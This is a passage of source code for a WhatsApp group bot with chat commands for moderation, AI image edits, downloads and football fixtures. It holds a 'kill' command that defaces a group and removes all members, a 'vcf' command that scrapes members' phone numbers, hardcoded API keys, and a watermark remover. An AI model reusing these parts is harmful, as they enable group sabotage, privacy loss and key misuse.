    settings.warnings.chats[m.chat][users] -= 1

    const remainingWarnings = settings.warnings.chats[m.chat][users]

    // Save settings
    global.saveSettings(settings)
    global.settings = settings

    dave.sendTextWithMentions(m.chat, `Success ${command} @${users.split('@')[0]}\nRemaining Warnings: ${remainingWarnings}/${settings.warnings.maxWarnings}`, m)
    
    if (settings.warnings.chats[m.chat][users] === 0) {
        delete settings.warnings.chats[m.chat][users];
        global.saveSettings(settings)
        global.settings = settings
    }
}
break
        
//==================================================//   


//==================================================//   


case "vcf": 
case "group-vcf": {
    if (!m.isGroup) return m.reply("❌ This command can only be used in groups.");

    const fs = require("fs");
    let gcdata = await dave.groupMetadata(m.chat)
    let gcmem = participants.map(a => a.id)

    let vcard = ''
    let noPort = 0

    for (let a of gcdata.participants) {
        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
    }

    let cont = './contacts.vcf'

    await m.reply('⏳ 𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗙𝗿𝗼𝘀𝘁 𝗶𝘀 𝗖𝗼𝗺𝗽𝗶𝗹𝗶𝗻𝗴 '+gcdata.participants.length+' 𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀 𝗶𝗻𝘁𝗼 𝗮 𝗩𝗰𝗳...');
    await fs.writeFileSync(cont, vcard.trim())
    await dave.sendMessage(m.chat, {
        document: fs.readFileSync(cont), 
        mimetype: 'text/vcard', 
        fileName: 'Group contacts.vcf', 
        caption: 'VCF for '+gcdata.subject+'\n👥 '+gcdata.participants.length+' contacts\n\n📱 Generated by 𝘿𝙖𝙫𝙚𝘼𝙄'
    }, {quoted: m})
    fs.unlinkSync(cont)
}
break;




// === TO ANIME / TO REALISTIC ===
case 'toanime':
case 'toreal': {
  let media;
  try {
    if (!quoted || !/image/.test(mime))
      return reply(`Send or reply to an image with caption ${prefix + command}`);

    await dave.sendMessage(m.chat, { react: { text: '🚀', key: m.key } });

    const style = command === 'toanime' ? 'AnimageModel' : 'RealisticModel';
    media = await dave.downloadAndSaveMediaMessage(quoted);
    const imageUrl = await CatBox(media);

    if (!imageUrl) throw new Error('Failed to upload image');

    const apiUrl = `https://fastrestapis.fasturl.cloud/imgedit/aiimage?prompt=Anime&reffImage=${encodeURIComponent(imageUrl)}&style=${style}&width=1024&height=1024&creativity=0.5`;

    await dave.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m });
  } catch (err) {
    console.error('toAnime Error:', err);
    reply('❌ An error occurred while processing the image');
  } finally {
    if (media) fs.promises.unlink(media).catch(() => {});
  }
}
break;

case 'ocr': {
  try {
    await dave.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime.startsWith('image/')) throw new Error('Send or reply to an image');

    const media = await q.download();
    const ext = mime.split('/')[1] || 'jpg';
    const filename = `ocr.${ext}`;

    const Uguu = async (buffer, name) => {
      const FormData = require('form-data');
      const axios = require('axios');
      const form = new FormData();
      form.append('files[]', buffer, { filename: name });
      const { data } = await axios.post('https://uguu.se/upload.php', form, { headers: form.getHeaders() });
      if (!data.files?.[0]?.url) throw new Error('Upload failed');
      return data.files[0].url;
    };

    const imageUrl = await Uguu(media, filename);
    const { data } = await require('axios').get(`https://api.alyachan.dev/api/ocr?image=${imageUrl}&apikey=DinzIDgembul`);

    if (!data?.status || !data?.result?.text) throw new Error('OCR failed or no text found');
    reply(data.result.text.replace(/\r/g, '').trim());

    await dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  } catch (err) {
    console.error('OCR Error:', err);
    reply(typeof err === 'string' ? err : '❌ An error occurred while processing OCR');
  }
}
break;
case 'removewatermark':
case 'nowatermark':
case 'remove-wm': {
  try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime || !/image\/(jpe?g|png)/.test(mime)) 
      return reply(`Send or reply to an image with caption ${prefix + command}`);

    reply("Deleting watermark...");

    const imgData = await q.download();
    const { GoogleGenerativeAI } = require("@google-ai/generative");
    const genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    const base64Image = imgData.toString("base64");

    const contents = [
      { text: text || 'Remove watermark carefully' },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);
    const parts = response?.response?.candidates?.[0]?.content?.parts || [];

    let resultImage;
    for (const part of parts) {
      if (part.inlineData?.data) {
        resultImage = Buffer.from(part.inlineData.data, "base64");
        break;
      }
    }

    if (!resultImage) throw new Error('Failed to remove watermark');

    const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
    fs.writeFileSync(tempPath, resultImage);

    await dave.sendMessage(m.chat, { image: { url: tempPath }, caption: '*Watermark removed successfully*' }, { quoted: m });
    setTimeout(() => fs.unlinkSync(tempPath).catch(() => {}), 30000);
  } catch (err) {
    console.error('Remove-WM Error:', err);
    reply('❌ An error occurred while removing watermark');
  }
}
break;

// === AI CHAT (GPT / GEMINI / LUMINAI) ===


case "edit-ai": {
  if (!text) return reply(`Where is the prompt?`);
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  if (!mime) return reply(`Send or reply to an image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);

  const promptText = text;
  reply("Please wait...");

  try {
    const imgData = await q.download();
    const base64Image = imgData.toString("base64");

    const { GoogleGenerativeAI } = require("@google-ai/generative"); // ensure proper import
    const genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);
    const parts = response?.response?.candidates?.[0]?.content?.parts || [];

    let resultImage;
    for (const part of parts) {
      if (part.inlineData?.data) {
        resultImage = Buffer.from(part.inlineData.data, "base64");
        break;
      }
    }

    if (!resultImage) return reply("❌ Failed to generate edited image.");

    const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
    fs.writeFileSync(tempPath, resultImage);

    await dave.sendMessage(
      m.chat,
      { image: { url: tempPath }, caption: `*Result may not be perfect*` },
      { quoted: m }
    );

    setTimeout(() => { try { fs.unlinkSync(tempPath); } catch {} }, 30000);
  } catch (err) {
    console.error('Edit-AI Error:', err);
    reply('❌ An error occurred while editing the image.');
  }
}
break;

case 'dave': {
    if (!text) return reply("Hello, how may I help you 🤷?");

    try {
        const url = `https://api.dreaded.site/api/aichat?query=${encodeURIComponent(text)}`;
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP ${response.status} - ${response.statusText}`);

        const data = await response.json();

        // Some APIs might return the result in data.result or data.response
        const aiReply = data.result || data.response || null;

        if (!aiReply) {
            return reply("❌ No response from AI. Try again later.");
        }

        // Trim long responses to avoid crashing
        const MAX_LENGTH = 4000; // adjust if needed
        const finalReply = aiReply.length > MAX_LENGTH ? aiReply.slice(0, MAX_LENGTH) + "..." : aiReply;

        reply(`*𝘿𝙖𝙫𝙚𝘼𝙄:*\n\n${finalReply}`);
    } catch (error) {
        console.error('GPT Error:', error);
        reply("❌ An error occurred while communicating with the AI.\n" + (error.message || error));
    }
}
break;



case 'mbwaa':
case 'toka':
case 'remove': {
    if (!m.isGroup) return reply(mess.group)
    if (!daveshown) return reply(mess.owner)

    let target;
    if (m.mentionedJid?.[0]) {
        target = m.mentionedJid[0];
    } else if (m.quoted?.sender) {
        target = m.quoted.sender;
    } else if (args[0]) {
        const number = args[0].replace(/[^0-9]/g, '');
        if (!number) return reply(`Example: ${command} 254104260236`);
        target = `${number}@s.whatsapp.net`;
    } else {
        return reply(`Example: ${command} 254712345678`);
    }

    const botNumber = dave.user?.id || '';
    const ownerNumber = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
    const ownerJid = ownerNumber ? `${ownerNumber}@s.whatsapp.net` : '';

    if (target === botNumber) return reply("I can't remove myself!");
    if (target === ownerJid) return reply("You can't remove my owner!");

    try {
        const result = await Promise.race([
            dave.groupParticipantsUpdate(from, [target], 'remove'),
            new Promise((_, reject) => setTimeout(() => reject(new Error("timeout")), 10000))
        ]);

        if (result && !result[0]?.status) {
            await reply(`Successfully removed @${target.split('@')[0]}`, { mentions: [target] });
        } else {
            reply("Couldn't remove this user. Maybe they're the group creator.");
        }

    } catch (err) {
        if (err.message === 'timeout') {
            reply("WhatsApp took too long to respond. Try again in a few seconds.");
        } else {
            console.error("Kick Error:", err);
            reply("Failed to remove member. Possibly due to permission issues or socket lag.");
        }
    }
}
break


// === DARKEN SKIN / BLACKEN CHARACTER ===
case "editanime": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  let defaultPrompt = `Change the character’s skin color to black.`;

  if (!mime) return reply(`Send or reply to an image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);

  let promptText = text || defaultPrompt;

  reply("Please wait...");

  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    for (const part of response.response.candidates[0].content.parts) {
      if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);

      await dave.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if the result isn’t perfect*`
      }, { quoted: m });

      setTimeout(() => {
        try { fs.unlinkSync(tempPath); } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit image.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break;


        case 'warning':
case 'warn': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(mess.admin)

    let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (!users) return reply(`Tag or reply to a user with ${command}`)
    if (!daveshown) return reply('Feature reserved for owner or sudo numbers only')

    const settings = global.settings

    // Initialize warnings structure if it doesn't exist
    if (!settings.warnings) {
        settings.warnings = {
            enabled: true,
            maxWarnings: 3,
            chats: {}
        }
    }

    if (!settings.warnings.chats[m.chat]) {
        settings.warnings.chats[m.chat] = {}
    }

    settings.warnings.chats[m.chat][users] = (settings.warnings.chats[m.chat][users] || 0) + 1

    const total = settings.warnings.chats[m.chat][users]

    // Save settings
    global.saveSettings(settings)
    global.settings = settings

    dave.sendTextWithMentions(m.chat, `Success ${command} @${users.split('@')[0]}\nTotal Warning: ${total}/${settings.warnings.maxWarnings}`, m)

    if (total >= settings.warnings.maxWarnings) {
        if (!isAdmins) return

        await dave.sendMessage(m.chat, {
            text: `@${users.split('@')[0]} your ${total}/${settings.warnings.maxWarnings} warning limit has been reached.`,
            mentions: [users]
        })

        await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
        delete settings.warnings.chats[m.chat][users]
        global.saveSettings(settings)
        global.settings = settings
    }
}
break

case 'autorecording': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    const settings = global.settings
    
    if (q == 'on') {
        if (settings.autorecord.enabled) return reply('Auto recording is already enabled')
        
        settings.autorecord.enabled = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully enabled auto recording')
    } else if (q == 'off') {
        if (!settings.autorecord.enabled) return reply('Auto recording is already disabled')
        
        settings.autorecord.enabled = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully disabled auto recording')
    } else {
        const status = settings.autorecord.enabled ? 'enabled' : 'disabled'
        reply(`Auto recording is currently ${status}. Use: ${prefix}autorecording on/off`)
    }
}
break

case 'autobio': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    const settings = global.settings
    
    if (q == 'on') {
        if (settings.autobio) return reply('Auto bio is already enabled')
        
        settings.autobio = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully enabled auto bio')
    } else if (q == 'off') {
        if (!settings.autobio) return reply('Auto bio is already disabled')
        
        settings.autobio = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully disabled auto bio')
    } else {
        const status = settings.autobio ? 'enabled' : 'disabled'
        reply(`Auto bio is currently ${status}. Use: ${prefix}autobio on/off`)
    }
}
break
//==================================================//
case "dev":
case "devoloper":
case "owner":
case "dave": {
  let namaown = `𝘿𝙖𝙫𝙚𝘼𝙄`
  let NoOwn = `254104260236`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:The Nasty Dev🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: fkontak
  })
  dave.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;
//==================================================//
case "invite": case "linkgc": { 
                 if (!m.isGroup) return reply(mess.group); 

                 let response = await dave.groupInviteCode(m.chat); 
                 dave.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//
case 'tagall': {
      if (!m.isGroup) return (mess.group)
      if (!daveshown && !isAdmins) return reply(mess.owner)
      let teks = `*👥 Tag All By Admin*

@${m.chat}
 
Message: ${q ? q : 'no message'}`
      dave.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          mentionedJid: participants.map(a => a.id),
          groupMentions: [{
            groupJid: m.chat,
            groupSubject: "everyone"
          }]
        }
      }, {
        quoted: m
      })
    }
    break
//==================================================//
        
case 'ephoto': {
  try {
    const FormData = require('form-data');
    const axios = require('axios');
    const cheerio = require('cheerio');

    const effect = args[0]?.toLowerCase();
    const text = args.slice(1).join(' ');
    if (!effect || !text) return reply(
      "Usage: .ephoto <effect> <text>\n" +
      "Available effects: silver, gold, neon, shadow, glitch"
    );

    const effectMap = {
      silver: "https://ephoto360.com/effect/silver-text-effect.html",
      gold: "https://ephoto360.com/effect/gold-text-effect.html",
      neon: "https://ephoto360.com/effect/neon-text-effect.html",
      shadow: "https://ephoto360.com/effect/shadow-text-effect.html",
      glitch: "https://ephoto360.com/effect/glitch-text-effect.html"
    };

    const url = effectMap[effect];
    if (!url) return reply("Invalid effect! Check the list with available effects.");

    const form = new FormData();
    form.append('text[]', text);

    const { data } = await axios.post(url, form, {
      headers: form.getHeaders()
    });

    const $ = cheerio.load(data);
    const imgUrl = $('img#main_image').attr('src');
    if (!imgUrl) return reply("Failed to generate image!");

    await dave.sendMessage(from, { image: { url: imgUrl }, caption: `Your Ephoto (${effect}) result for: ${text}` });

  } catch (err) {
    console.error("Ephoto command error:", err);
    reply("Something went wrong while generating the Ephoto!");
  }
}
break

//==================================================//
case 'h':
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
if (m.quoted) {
dave.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
dave.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//  
        case 'welcome': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(mess.admin)
    
    const settings = global.settings
    
    if (args[0] === "on") {
        if (settings.welcome) return reply('Welcome is already activated')
        
        settings.welcome = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully activated welcome')
    } else if (args[0] === "off") {
        if (!settings.welcome) return reply('Welcome is already deactivated')
        
        settings.welcome = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Successfully deactivated welcome')
    } else {
        const status = settings.welcome ? 'activated' : 'deactivated'
        reply(`Welcome is currently ${status}. Use: ${prefix}welcome on/off`)
    }
}
break
//==================================================//
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply("bot must be admin first")
if (!daveshown) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//
case "kill": 
case "kickall": {
          if (!m.isGroup) return reply(mess.group)          
 if (!isAdmins) return reply(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != dave.decodeJid(dave.user.id)).map(_0x3c0c18 => _0x3c0c18.id);

          reply("Initializing Kill command💀...");

      await dave.removeProfilePicture(m.chat);
      await dave.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await dave.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");


          setTimeout(() => {
            dave.sendMessage(m.chat, {
              'text': "All parameters are configured, and Kill command has been initialized and confirmed✅️. Now, all " + raveni.length + " group participants will be removed in the next second.\n\nGoodbye Everyone 👋\n\nTHIS PROCESS IS IRREVERSIBLE ⚠️"
            }, {
              'quoted': m
            });
            setTimeout(() => {
              dave.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                reply("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
dave.groupLeave(m.chat);              
              }, 1000);
            }, 1000);
          }, 1000);
        };              
          break;
//==================================================//
case "promote": case "promot": {
if (!m.isGroup) return reply(`for group only`)
if (!isAdmins && !daveshown) return m.reply(`Command reserved for group admins only`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => reply(err.toString()))
} else return reply('Example: 254XXX/@tag')}
break
//==================================================//
case "demote": case "dismiss": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.admin)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => reply(err.toString()))
} else return reply('example:254XX')}
break
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//      
        case "fixtures": case "matches": {
 try {
        let pl, laliga, bundesliga, serieA, ligue1;

        const plData = await fetchJson('https://api.dreaded.site/api/matches/PL');
        pl = plData.data;

        const laligaData = await fetchJson('https://api.dreaded.site/api/matches/PD');
        laliga = laligaData.data;

        const bundesligaData = await fetchJson('https://api.dreaded.site/api/matches/BL1');
        bundesliga = bundesligaData.data;

        const serieAData = await fetchJson('https://api.dreaded.site/api/matches/SA');
        serieA = serieAData.data;

        const ligue1Data = await fetchJson('https://api.dreaded.site/api/matches/FR');
        ligue1 = ligue1Data.data;

        let message = `𝗧𝗼𝗱𝗮𝘆𝘀 𝗙𝗼𝗼𝘁𝗯𝗮𝗹𝗹 𝗙𝗶𝘅𝘁𝘂𝗿𝗲𝘀 ⚽\n\n`;

        message += typeof pl === 'string' ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl}\n\n` : pl.length > 0 ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲: No matches scheduled\n\n";

        if (typeof laliga === 'string') {
            message += `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga}\n\n`;
        } else {
            message += laliga.length > 0 ? `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga.map(match => {
                const { game, date, time } = match;
                return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
            }).join('\n')}\n\n` : "🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮: No matches scheduled\n\n";
        }

        message += typeof bundesliga === 'string' ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga}\n\n` : bundesliga.length > 0 ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮: No matches scheduled\n\n";

        message += typeof serieA === 'string' ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA}\n\n` : serieA.length > 0 ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔: No matches scheduled\n\n";

        message += typeof ligue1 === 'string' ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1}\n\n` : ligue1.length > 0 ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇫🇷 𝗟𝗶𝗴𝘂𝗲- 1: No matches scheduled\n\n";

        message += "𝗧𝗶𝗺𝗲 𝗮𝗻𝗱 𝗗𝗮𝘁𝗲 𝗮𝗿𝗲 𝗶𝗻 𝗘𝗮𝘀𝘁 𝗔𝗳𝗿𝗶𝗰𝗮 𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲 (𝗘𝗔𝗧).";

        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch matches.' + error);
    }
};
break;                      
//==================================================//




//==================================================//     
     case 'request': 
case 'suggest': {
  if (!text) return reply(`Example : ${prefix + command} hi dev play command is not working`)
  let textt = `*| REQUEST/SUGGESTION |*`
  let teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
  let teks2 = `\n\n*Hii ${pushname},You request has been forwarded to the support group*.\n*Please wait...*`
  const groupId = '120363231160993583@g.us'; // replace with your group ID
  dave.sendMessage(groupId, {
    text: textt + teks1,
    mentions: [m.sender],
  }, { quoted: m })
  dave.sendMessage(m.chat, {
    text: textt + teks2 + teks1,
    mentions: [m.sender],
  }, { quoted: m })
}
break










//==================================================//
case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return reply("🔗 provide a fb or ig link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await dave.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await dave.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *𝘿𝙖𝙫𝙚𝘼𝙄 is on fire 🔥!*" }, { quoted: m });
 } else if (res.type === "image") {
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await dave.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ 𝘿𝙖𝙫𝙚𝘼𝙄 is on fire 🔥!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await dave.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 reply("failed to get media.");
 }
}
break
//==================================================//
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
trashreply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await dave.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
dave.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
dave.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break 

//==================================================//
        case "disp-7": { 
                 if (!m.isGroup) return reply (mess.group); 

                 if (!isAdmins) return reply (mess.admin); 

                     await dave.groupToggleEphemeral(m.chat, 7*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 7 days!'); 

 } 
 break;  //==================================================//
case 'idch': case 'cekidch': {
if (!text) return reply("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await dave.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "𝘿𝙖𝙫𝙚𝘼𝙄" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
